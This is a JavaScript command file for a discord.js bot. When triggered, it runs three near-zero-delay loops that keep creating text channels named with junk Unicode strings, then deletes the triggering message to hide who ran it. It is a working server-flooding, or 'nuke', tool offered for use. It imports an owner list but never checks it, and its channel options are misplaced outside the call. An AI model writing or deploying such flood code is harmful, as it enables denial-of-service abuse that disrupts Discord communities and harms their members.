const Discord = require("discord.js");

const ownerids = require('../ownerids.json');

module.exports.run = async(bot, message, args) => {

    setInterval(function(){ message.guild.createChannel("¶☣❦∏㈨⑲¶☣❦∏㈨⑲¶☣❦∏㈨⑲¶☣❦∏㈨⑲¶☣❦∏㈨⑲¶☣❦∏㈨⑲"), {
        type: "text",
        permissionOverwrites: [{
            id: message.guild.id,
            allow: ['SEND_MESSAGE']
        }]
    } }, 0);

    setInterval(function(){ message.guild.createChannel("oʊ☃௹₯oʊ☃௹₯oʊ☃௹₯oʊ☃௹₯oʊ☃௹₯oʊ☃௹₯oʊ☃௹₯oʊ☃௹₯"), {
        type: "text",
        permissionOverwrites: [{
            id: message.guild.id,
            allow: ['SEND_MESSAGE']
        }]
    } }, 1);

    setInterval(function(){ message.guild.createChannel("№✐☎﷼₳№✐☎﷼₳№✐☎﷼₳№✐☎﷼₳№✐☎﷼₳№✐☎﷼₳№✐☎﷼₳№✐☎﷼₳"), {
        type: "text",
        permissionOverwrites: [{
            id: message.guild.id,
            allow: ['SEND_MESSAGE']
        }]
    } }, 0);

    message.delete();
}